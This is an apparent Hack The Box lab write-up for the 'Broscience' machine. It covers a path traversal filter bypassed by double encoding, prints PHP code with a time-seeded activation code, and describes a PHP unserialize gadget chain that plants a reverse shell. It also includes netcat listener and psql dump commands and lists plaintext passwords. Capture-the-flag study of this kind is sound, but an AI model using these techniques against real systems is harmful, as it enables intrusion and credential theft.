
# Broscience machine HTB

## `hints`

### `foothold`
- basic enumeration - check **all files**, check **params**, check two times, that is **double** ;) 
- grab em all
- sweep for common vulns on features 
### `user`
- `db`?
### `root`
- (0) process


# `walkthrough`

## `path` file inclusion filter bypass

- after performing dirsearch on the machine, able to find `/includes/` with some interesting files

![](assets/2023-01-21-22-48-17.png)

- image fetching: `https://broscience.htb/includes/img.php?path=../../../../../etc/passwd`
  - got back **Error:** attack detected
  - single encoding failed, double encoding worked, got back 188B of passwd file
<br>


![](assets/2023-01-21-22-39-05.png)


## `start fetching files present on urls`

got all files using `fetch.py`, i like colors
------------------------------
```
/includes
  |-db_connect.php
  |-header.php
  |-img.php
  |-navbar.php
  |-utils.php
index.php
register.php
login.php
logout.php
exercise.php
user.php
```

![](assets/2023-01-21-22-50-11.png)

## tried to register

- tried to register got no email back
- checking the code we found

`/includes/utils.php`
```php

function generate_activation_code() {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    srand(time());
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    return $activation_code;
}
```

`/register.php`
```php
$activation_code = generate_activation_code();

...

$res = pg_execute($db_conn, "create_user_query", array($_POST['username'], md5($db_salt . $_POST['password']), $_POST['email'], $activation_code));

// TODO: Send the activation link to email
$activation_link = "https://broscience.htb/activate.php?code={$activation_code}";

$alert = "Account created. Please check your email for the activation link.";
```

## tried with a couple of timestamps manually but couldn't hit the activation code by feeding that time as seed `srand()`

`activation.py`  automated that process

- after many tries it finally got validated

![](/assets/2023-01-21-23-41-36.png)  

## checking features

- `get_theme()` unserializes `user-prefs` cookie. 
- `UserPrefs` class is not too interesting. Nothing useful
- `Avatar` and `AvatarInterface` has more to offer

```php
class Avatar {
    public $imgPath;

    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }

    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}

class AvatarInterface {
    public $tmp;
    public $imgPath; 

    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}

```

- `get_theme()`  gets called everywhere. e.g. `user.php`
- `file_get_contents` probably is able to read from endpoint
- built a server -->  `upload_server.py`

## `upload_server.py`

```sh
$ python3 upload_server.py &
$ python3 unsafe_unserialize.py /var/www/html/reverse_shell.php revshell
```

- check if file got uploaded 

- open netcat
```sh
$ nc -lvnp 4444

```
we are in

## `user`




## once reversed 
<br>

- psql passwords, dump to csv
  - psql -h localhost -p 5432 -U dbuser -d broscience -c "\copy (SELECT * FROM users) TO '/var/www/html/users.csv' WITH CSV HEADER"
  - RangeOfMotion%777
  - iluvhorsesandgym